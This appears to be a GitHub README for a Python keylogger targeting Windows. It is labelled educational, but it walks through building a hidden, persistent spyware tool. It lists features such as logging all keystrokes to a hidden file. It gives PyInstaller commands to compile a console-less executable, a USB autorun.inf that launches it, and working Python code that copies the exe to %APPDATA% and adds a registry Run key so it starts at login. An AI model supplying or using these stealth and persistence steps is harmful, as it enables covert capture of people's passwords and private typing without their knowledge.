#Windows keylogger
A lightweight, Windows-compatible keylogger created for *educational* and *ethical penetration testing* purposes. This project helps cybersecurity students, malware analysts, and red teamers study keystroke logging techniques in controlled environments.
## ⚙️ Features

- ✅ Logs all alphanumeric and special key presses
- ✅ Stores logs in a hidden file in `%APPDATA%`
- ✅ Optional persistence using Windows Registry (Run key)
- ✅ Minimal footprint and background execution
- ✅ Compiles to a single `.exe` with no console window (`--noconsole`)
- ✅ Suitable for virtual lab setups, forensics, and red team simulations

## ⚠️ Disclaimer

> This tool is strictly for **legal, ethical, and educational purposes only**.  
> Do **not** use it on systems you do not own or without **explicit written permission**.  
> The author assumes **no responsibility** for any misuse or damage caused by this tool.
>
> ## 🚀 Installation & Usage

### 1. Clone the Repository

```bash
git clone https://github.com/yourusername/KeyLogger-Lab.git
cd KeyLogger-Lab
``` 

Output will be in the dist/ folder.

🛠 Optional:
Startup Persistence (for research only)
To simulate malware behavior, you can enable persistence by copying the .exe to %APPDATA% and setting a registry Run key. See stealth_mode.py for a demo.

do you want to package this Python logger into an EXE and autorun from a USB (on Windows)?
Here is step-bystep guide :
 Step 1: Convert Python Keylogger to EXE
 Use PyInstaller:
 '''
 pip install pyinstaller
pyinstaller --noconsole --onefile keylogger.py  '''

--noconsole hides the terminal window.

The output EXE will be in dist/keylogger.exe.
 Create USB Structure :
 USB_DRIVE/
│
├── keylogger.exe
└── autorun.inf  (optional - doesn’t work by default on modern Windows)

autorun.inf (mostly blocked by modern Windows):
```bash
[autorun]
label=My USB Tool
icon=keylogger.ico
open=keylogger.exe
```
 This will not autorun on most systems unless they’ve been misconfigured or are very outdated.

 Step 3: Optional — Make It Run Silently and Persist (Ethical Only)
You can optionally:
Move the EXE to %APPDATA% using a script.
Set a registry key for persistence.
Hide the file.
Example persistence (educational only):
```bash
 import os
import shutil
import winreg

def add_to_startup(file_path):
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "MyKeylogger", 0, winreg.REG_SZ, file_path)
    winreg.CloseKey(key)

destination = os.path.join(os.getenv("APPDATA"), "keylogger.exe")
if not os.path.exists(destination):
    shutil.copyfile("keylogger.exe", destination)
    add_to_startup(destination)
```


⚠️ Again, this is only for lab simulation — do not enable this on real machines or without permission.

📬 Contact
Created by Sarwar ilyas feel free to contribute, fork, or contact for collaborations in cybersecurity research.
